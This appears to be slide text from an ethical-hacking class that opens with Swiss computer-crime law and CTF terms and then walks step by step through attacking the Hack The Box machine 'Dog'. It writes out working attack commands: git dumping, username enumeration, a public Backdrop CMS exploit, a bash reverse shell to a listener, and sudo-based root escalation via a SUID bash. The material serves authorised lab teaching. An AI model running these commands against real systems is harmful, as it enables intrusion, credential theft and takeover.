Ethical hacking, CTFs and the law
Offensive security
aka ethical hacking / white-hat hacking
  • Understand the technology
  • Accept there is no 100% security
  • Find vulnerabilities before others do
  • Contradict every assumption
Legal aspects
Computer hacking is illegal, right?
Art. 143bis Swiss Penal Code — unauthorised access to a data processing system.
Hack The Box gives you a lab you are explicitly authorised to attack. Permission is what separates the two — never the technique.
Gamification
Capture the Flag (CTF)
Solve a challenge, find a flag string, submit it, score points. A hacking competition with a scoreboard.
(warning: addictive)
Hacker glossary
Term
What it means, and where it comes from
To pwn
To fully compromise a system. A typo of “own”, from video-game culture. Lives on in Have I Been Pwned, Pwn2Own and the Pwnie Awards.
Capture the Flag (CTF)
A security competition where solving a challenge yields a flag string you submit for points. Borrowed from military exercises.
Red team / blue team
Offensive side (adversary simulation) versus defensive side (hardening, detection, response). Also from military exercises.
1337 / leet
“Elite”, written in leetspeak, where l3tt3r5 4re 5w4pp3d f0r l00k4l1ke d1g1t5. From the bulletin-board slang of the 1980s.
Foothold
Initial access to the target machine, usually via remote code execution and usually as a low-privileged user. Gets you the user.txt flag.
Privesc
Privilege escalation: going from a low-privileged user to root (Linux) or SYSTEM (Windows). Gets you the root.txt flag.

Hacking / Walkthrough
Task 01 / 12
How many open TCP ports are listening on Dog?
Add the target to /etc/hosts
# 1 — open the hosts file as root
$ sudo nano /etc/hosts
# 2 — add one line at the end, with your target IP
10.129.X.X    dog.htb
Your IP is yours alone
Everyone spawns a separate instance. Take the Target IP Address from your own box page — the one on this slide and your neighbour’s are both wrong for you.
nano in three keys
Ctrl+O then Enter writes the file, Ctrl+X quits. The sudo matters: /etc/hosts is root-owned, and without it nano opens read-only.
What a port actually is: the internet stack
LAYER
WHAT IT DOES
ADDRESSED BY
SENDING A LETTER
Application
Gives applications a way to talk
HTTP, SSH, SMTP
What the letter says, and in which agreed format
Transport
Delivers data to the right service on a host
TCP port 1337
The flat number on the letterbox
Internet
Routes packets between networks
203.0.113.45
The postal address on the envelope
Network access
Moves bits over cable or Wi-Fi
48:2C:6A:1E:59:3F
The roads and the delivery van
nmap works on the transport layer, shaded above: it knocks on every flat number — all 65,535 of them — and writes down which ones answer.
nmap — the network mapper
Basic usage
$ nmap <target>
Target is a hostname or an IP address.
Pick your ports
$ nmap -p21,22,80-99 <target> $ nmap -p- <target>
A list, a range, or -p- for all 65,535.
Ask what is running
$ nmap -sV -sC <target>
-sV fingerprints service and version, -sC runs the default scripts.
Go faster
$ nmap --min-rate=1000 -T4 <target>
Packets per second, and a timing template from 0 to 5.
THE TWO-PASS HABIT
$ nmap -p- --min-rate=1000 <target>   # which doors exist
$ nmap -p22,80 -sV -sC <target>      # what is behind them

Task 04 / 12
What is the password the application uses to connect to the database?
What is inside .git
HEAD
which branch you are on
ref
the newest commit hash
commit
message, author, tree, parent
tree
a directory listing
blob
one file’s contents
.git/
├── HEAD
├── config
├── index
├── logs/HEAD
├── refs/heads/master
└── objects/
    ├── 1a/2b3c4d5e6f...
    └── ff/9e8d7c6b5a...
Content-addressed, not diffs
Every object is a file under .git/objects/, zlib-compressed and named by the SHA-1 of its own contents. Git keeps whole snapshots, never deltas between them.
Which means two things: a hash is also a path, and every object names the hashes it points at. Follow those pointers and you have the entire history.
How git-dumper rebuilds the repository
1
Seed
Request the files git always writes to the same place: /.git/HEAD, /.git/config, /.git/index, /.git/logs/HEAD, /.git/refs/heads/*.
2
Read the hashes
Each of those names object hashes — the branch tip, every commit in the reflog, every blob listed in the index.
3
Fetch each object
One plain GET per hash: /.git/objects/ + first 2 hex characters + / + the remaining 38. The hash is the URL.
4
Follow the graph
Decompress and parse: a commit names its tree and its parent, a tree names its blobs. Every unseen hash goes back on the queue.
5
Check out
When the queue empties, run git checkout locally and the working tree — all of it, every past revision — is back on disk.
No directory listing required. The webserver only has to hand over files when asked by name — and git’s own layout makes every name predictable.
Dumping Dog’s repository
# get the tool
$ git clone https://github.com/arthaud/git-dumper.git
$ cd git-dumper
$ pip install -r requirements.txt
 
# dump the repository into an empty folder
$ mkdir ~/dog-src
$ ./git_dumper.py http://dog.htb ~/dog-src
 
# read what came back
$ cd ~/dog-src && git log --oneline
URL first, output directory second — and the directory must be empty. If pip refuses to install system-wide, use pip install --user -r requirements.txt or a virtualenv.

Task 05 / 12
What user uses the DB password to log into the admin functionality of Backdrop CMS?
The login form answers more than it was asked
http://dog.htb/?q=user/login
NO SUCH ACCOUNT
“Sorry, unrecognized username”
The name you guessed does not exist. Move on.
ACCOUNT EXISTS
“Sorry, incorrect password”
The name is real. Only the password was wrong.
PASSWORD RESET — A SECOND ORACLE
“Sorry, meow is not recognized as a user name or an email address.”
Two wrong guesses, two different answers — and the difference tells you which half was right. That is username enumeration: a list of real accounts, for free, before any password is tried.
BackDropScan: enumeration, the slow way
A Backdrop-specific scanner. Its --userenum mode walks a wordlist and reports every name the site admits to.  github.com/FisMatHack/BackDropScan
$ git clone https://github.com/FisMatHack/BackDropScan.git
 
$ python BackDropScan.py --url http://dog.htb --userenum \
      --userslist /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
[+] Valid username: john
^C[!] Exiting...
The catch: one HTTP request per candidate, strictly in sequence. Against a ten-million-name list that is hours, and we have until 12:15. Hence the Ctrl-C.
The same oracle, forty at a time
Read the scanner’s source and you see the request it actually sends: ?q=accounts/FUZZ. ffuf can ask that question with forty threads instead of one.
$ ffuf -u 'http://dog.htb/?q=accounts/FUZZ' \
       -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
 
 :: Method
: GET
 :: URL
: http://dog.htb/?q=accounts/FUZZ
 :: Threads
: 40
 :: Matcher
: Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
 
john
[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 17ms]
tiffany
[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 149ms]
John
[Status: 403, Size: 7544, Words: 643, Lines: 114, Duration: 11ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
An account that exists answers 403 — you may not read someone else’s profile. An unknown name 404s and never shows up. The status code is the entire oracle.
Task 06 / 12
What system user is the Backdrop CMS instance running as on Dog?
Fingerprinting the exact version
BackDropScan’s source points at a file that ships with every install and needs no login.
$ curl http://dog.htb/core/profiles/testing/testing.info
name = Testing
description = Minimal profile for running tests. Includes absolutely required modules only.
version = BACKDROP_VERSION
backdrop = 1.x
type = profile

dependencies[] = layout
 
; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
Authenticated RCE for Backdrop 1.27.1
ExploitDB has a public exploit for exactly this release. It breaks nothing by itself — it packages a Backdrop module with a webshell inside and tells you where to upload it.
$ curl -o exploit.py https://www.exploit-db.com/download/52021
 
$ python exploit.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php
Authenticated means: the module upload form needs the admin session from task 5. Without those credentials this exploit is just a zip builder.
Two snags on the way in
1
The clean URL 404s
The path the script prints is not reachable. Use the query form instead: http://dog.htb/?q=admin/modules/install — then Manual installation, bottom right, and Upload a module.
2
No zip handler
The server will not unpack shell.zip. Repack the very same folder as a gzipped tarball and upload that instead.
$ tar cvzf shell.tar.gz shell
shell/
shell/shell.info
shell/shell.php
Once it installs, the shell is live at http://dog.htb/modules/shell/shell.php
Catching a reverse shell
Generate the payload on revshells.com — then wrap it in bash -c before pasting it into the webshell.
1 · LISTENER, ON YOUR PWNBOX
$ nc -lvnp 4444
2 · PAYLOAD, IN THE WEBSHELL
bash -c "sh -i >& /dev/tcp/10.10.14.2/4444 0>&1"
Your IP, not the one on this slide
Read your own VPN address from the status bar in the top right of the Pwnbox desktop. 10.10.14.2 here is an example.
Any high TCP port
4444 is traditional. It only has to match between the listener and the payload.
One shot. The box deletes the evil module after a single command execution — a CTF design choice, because the machine is shared. Have the listener running before you fire.
Task 07 / 12
What system user on Dog shares the same DB password?
Who else lives on this box?
A password that works in one place is worth trying everywhere. /etc/passwd is world-readable and lists every account on the system.
$ tail -5 /etc/passwd
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
A human account has a UID of 1000 or above and a login shell. Everything ending in /bin/false is a service. That leaves two candidates: jobert and johncusack.
CONNECT AS johncusack
$ ssh johncusack@dog.htb

Task 09 / 12 · Privesc
What is the full path of the binary that the johncusack user can run as any user on Dog?
What am I allowed to run as root?
sudo runs a single command as another user — root unless told otherwise — but only where /etc/sudoers grants it. sudo -l asks sudo to list exactly what that permission is, for you, on this host. It is the first thing to run on any shell you land in.
$ sudo -l
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
(ALL : ALL) means as any user and any group — root included. One binary, and no NOPASSWD tag, so it asks for johncusack’s own password. Which settings.php already handed us.
Task 10 / 12 · Privesc
bee requires a root directory to run properly. What is the appropriate root directory on Dog?
bee has to be told where Backdrop lives
bee is Backdrop’s command line tool — the equivalent of drush. Its own manual explains the option that matters here.  github.com/backdrop-contrib/bee/wiki/Usage#global-options
--root
Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
$ bee --root=docroot status
Run through sudo, bee starts in whatever directory you are standing in — johncusack’s home, not the webroot. It finds no Backdrop there and refuses to do anything useful. So: where is the site actually installed?
Task 11 / 12 · Privesc
What is the bee subcommand to run arbitrary PHP code?
eval: arbitrary PHP, by design
Still the same manual, under Advanced.  github.com/backdrop-contrib/bee/wiki/Usage#advanced
eval
Description: Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
Aliases: ev , php-eval
Arguments: code — The PHP code to evaluate.
EXAMPLE
$ sudo /usr/local/bin/bee --root=/var/www/html eval 'echo shell_exec("id")'
sudo
grants bee as any user
bee eval
runs arbitrary PHP
PHP
can shell out
root
the chain ends here
From eval to a root shell
Command execution as root means we can do essentially anything. The tidiest move is to leave ourselves a door: copy /bin/bash somewhere writable and set the SUID bit on it.
johncusack@dog:~$ sudo bee --root=/var/www/html eval 'shell_exec("cp /bin/bash /tmp")'
johncusack@dog:~$ sudo bee --root=/var/www/html eval 'shell_exec("chmod u+s /tmp/bash")'
johncusack@dog:~$ ls -la /tmp/bash
-rwsr-xr-x 1 root root 1183448 Oct 30 03:11 /tmp/bash
johncusack@dog:~$ /tmp/bash -p
bash-5.0# id
uid=1001(johncusack) gid=1001(johncusack) euid=0(root) groups=1001(johncusack)
Why the -p?
A SUID binary starts with the owner’s effective UID — root, because root created the copy. But bash notices that its effective UID does not match the real one and drops the privilege straight back to johncusack. -p keeps it. Without the flag you get a prompt that looks right and can do nothing.
